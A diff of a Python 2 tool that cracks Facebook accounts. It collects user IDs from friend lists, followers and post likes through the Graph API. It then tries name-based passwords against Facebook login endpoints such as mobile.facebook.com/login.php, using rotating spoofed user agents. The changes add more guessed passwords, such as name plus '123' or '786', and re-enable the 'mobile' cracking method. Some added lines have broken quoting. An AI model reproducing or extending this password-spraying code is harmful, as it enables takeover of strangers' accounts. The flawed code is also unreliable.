@@ -29,7 +29,7 @@ sys.setdefaultencoding('utf8')
 ip = requests.get('https://api.ipify.org').text
 # Mohon tidak untuk di ubah #
 def logo():
-	print("""                 
+	print("""                  
 \033[1;91m  █▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
 \033[1;91m  █  \033[1;92m########..####..######..##.....##.##.....##  \033[1;91m█
 \033[1;91m  █  \033[1;92m##.....##..##..##....##.##.....##.##.....##  \033[1;91m█
@@ -44,7 +44,7 @@ def logo():
 \033[1;91m  █ \033[1;92m(҂`_´)     \033[1;91m[•] Facebook  : \033[1;92mRishu 3:)     \033[1;91m█
 \033[1;91m  █ \033[1;92m<,︻╦╤─--💥\033[1;91m[•] Version   : \033[1;92m0.2           \033[1;91m█
 \033[1;91m  █ \033[1;92m /﹋\     If You dream it con you do it  \033[1;91m█
-\033[1;91m  ╚═══════════════════•ೋೋ•════════════════════╝""""") 
+\033[1;91m  ╚═══════════════════•ೋೋ•═══════════════════╝""""") 
   
  
 kom = 'login'
@@ -114,12 +114,12 @@ def menu():
 		time.sleep(3)
 		x_()
 	except requests.exceptions.ConnectionError:
-		print ('\033[0;91m !: No Connection')
+		print ('\033[0;91m [•] No Connection')
 		sys.exit()
 	logo()
-	print"\033[0;97m Hay\033[0;92m " +ngentod
+	print"\033[0;97m Name\033[0;92m " +ngentod
 	print
-        print(" \033[0;91m╔══o00════════00o═════════════════════════╗")
+    print(" \033[0;91m╔══o00════════00o═════════════════════════╗")
 	print" \033[0;91m(01). \033[0;92mCrack from public Id"
 	print" \033[0;91m(02). \033[0;92mCrack from followers"
 	print" \033[0;91m(03). \033[0;92mCrack name search"
@@ -129,19 +129,19 @@ def menu():
 	pilih_menu()
 
 def pilih_menu():
-	mi = raw_input("\n\033[0;97m ?: pilih : ")
+	mi = raw_input("\n\033[0;97m [•] choose : ")
 	if mi == "":
 		print
-		print ("\033[0;91m !: Fill in correctly") 
+		print ("\033[0;91m [•] Fill in correctly") 
 		exit()
 	elif mi in['1','01']:
-		print ("\n \033[0;92m!: Type 'me' to crack your own friend list") 
-		idt = raw_input(" \033[0;92m?: Id Public : ")
+		print ("\n \033[0;92m[•] Type 'me' to crack your own friend list") 
+		idt = raw_input(" \033[0;92m[•] Id Public : ")
 		try:
 			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
 			sp = json.loads(pok.text)
 		except KeyError:
-			print ("\033[0;91m !: Id not public") 
+			print ("\033[0;91m [•] Id not public") 
 			exit()
 		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
 		z = json.loads(r.text)
@@ -151,13 +151,13 @@ def pilih_menu():
 			nm = na.rsplit(" ")[0]
 			id.append(uid+'|'+nm)
 	elif mi in['2','02']:
-		print ("\n \033[0;92m!: Type 'me' to crack your own followers") 
+		print ("\n \033[0;92m[•] Type 'me' to crack your own followers") 
 		idt = raw_input("\033[0;92m ?: Id Public : ")
 		try:
 			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
 			sp = json.loads(pok.text)
 		except KeyError:
-			print (" \033[0;91m!: Id not public") 
+			print (" \033[0;91m[•] Id not public") 
 			exit()
 		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=999999&access_token="+token)
 		z = json.loads(r.text)
@@ -167,7 +167,7 @@ def pilih_menu():
 			nm = na.rsplit(" ")[0]
 			id.append(uid+'|'+nm)
 	elif mi in['33','003']:
-		idt = raw_input("\033[0;92m ?: Public Post Id link : ")
+		idt = raw_input("\033[0;92m [•] Public Post Id link : ")
 		r = requests.get("https://graph.facebook.com/"+idt+"/likes?limit=9999999&access_token="+token)
 		z = json.loads(r.text)
 		for i in z['data']:
@@ -178,7 +178,7 @@ def pilih_menu():
 	elif mi in['4','04']:
 		print"\n\033[0;92m (01). Check OK Ids"
 		print"\n\033[0;91m (02). Check CP Ids"
-		ajg = raw_input("\n \033[0;92m?: choose : ")
+		ajg = raw_input("\n \033[0;92m[•] choose : ")
 		if ajg =="":
 			menu()
 		elif ajg in['1','01']:
@@ -199,19 +199,21 @@ def pilih_menu():
 		print ("\033[0;91m [•] choose the right one ") 
 		exit()
 	
-	print"\033[0;92m ?: total id  : " +str(len(id))
+	print"\033[0;92m [•] total id  : " +str(len(id))
 	anak_memek() 
 
 # Tambahan metode nya #
 def anak_memek():
+    print(" \033[0;91m╔═══════════════════════╗")
 	print ("\n\033[0;92m [ Select the crack method ] \n")
 	print ("\n\033[0;91m (01). \033[0;92mb-api (fast)")
 	print ("\n\033[0;91m (02). \033[0;92mmbasic (slow)")
-	#print ("\n\033[0;91m (03). \033[0;92mmobile (very slow)")
+	print ("\n\033[0;91m (03). \033[0;92mmobile (very slow)")
+	print(" \033[0;91m╚════════════════════════╝")
 	romixyz()
 
 def romixyz():
-	rom = raw_input("\n \033[0;91m?: choose : ")
+	rom = raw_input("\n \033[0;91m[•] choose : ")
 	if rom =='':
 		print ("\033[0;91m [•] choose the right one ")
 		romixyz()
@@ -254,7 +256,7 @@ def langsungapi():
 		except OSError:
 			pass
 		try:
-			for pw in [name.lower()+'123',name.lower()+'12345','sayang','anjing','786786']:
+			for pw in [name.lower()+'12',name.lower()+'123',name.lower()+1234',name.lower()+12345',name.lower()+786',name.lower()+001',name.lower()+007','123456','000786','223344','445566','786786']:
 				#upi = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36'
 				yuy = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
 				rx = random.choice(['Mozilla/5.0 (Linux; Android 10; Nokia 7.2 Build/QKQ1.191014.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/264.0.0.44.111;]','Mozilla/5.0 (Linux; U; Android 10; Nokia 7.2 Build/QKQ1.191014.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 OPR/52.2.2254.54723','Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 10; Redmi Note 9S Build/QKQ1.191215.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/327.0.0.33.120;]','Mozilla/5.0 (Linux; U; Android 10; en-in; Redmi Note 9 Pro Max Build/QKQ1.191215.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.141 Mobile Safari/537.36 XiaoMi/MiuiBrowser/11.9.3-g'])
@@ -422,6 +424,7 @@ def langsungbasic():
 					skm.append(nama+"1234")
 					skm.append(nama+"786")
 					skm.append(nama+"007")
+					skm.append(nama+"001")
 					skm.append("123456")
 					skm.append("223344")
 					skm.append("786786")
@@ -566,7 +569,7 @@ def mobile():
 		except OSError:
 			pass
 		try:
-			for pw in [name.lower()+'123',name.lower()+'12345','sayang','786786']:
+			for pw in [name.lower()+'12',name.lower()+'123',name.lower()+1234',name.lower()+12345',name.lower()+786',name.lower()+001',name.lower()+007','123456','000786','223344','445566','786786']:
 				rex = requests.post('https://mobile.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': ua})
 				xo = rex.content
 				if 'mobile_logout_button' in xo or 'save-device' in xo:
